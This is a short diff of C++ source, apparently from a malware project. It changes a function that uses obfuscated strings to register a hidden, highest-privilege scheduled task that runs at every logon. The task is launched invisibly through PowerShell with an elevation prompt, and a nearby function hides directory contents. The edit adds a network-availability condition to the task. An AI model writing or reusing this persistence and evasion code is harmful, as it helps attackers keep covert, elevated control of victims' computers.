@@ -280,7 +280,7 @@ void hide_directory_contents(const std::string& directoryPath) {
 BOOL create_scheduled_task(const std::string& taskName, const std::string& executablePath) {
     std::wstring longPath = std::wstring(executablePath.begin(), executablePath.end());
     std::string command = std::string(OBF("Register-ScheduledTask -TaskName \"")) + taskName +
-        std::string(OBF("\" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0) -Action (New-ScheduledTaskAction -Execute '")) +
+        std::string(OBF("\" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -RunOnlyIfNetworkAvailable -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0) -Action (New-ScheduledTaskAction -Execute '")) +
         std::string(longPath.begin(), longPath.end()) + std::string(OBF("') -Force -RunLevel Highest"));
     HINSTANCE hInst = ShellExecuteA(NULL, OBF("runas"), OBF("powershell.exe"), command.c_str(), NULL, SW_HIDE);
     return 0;
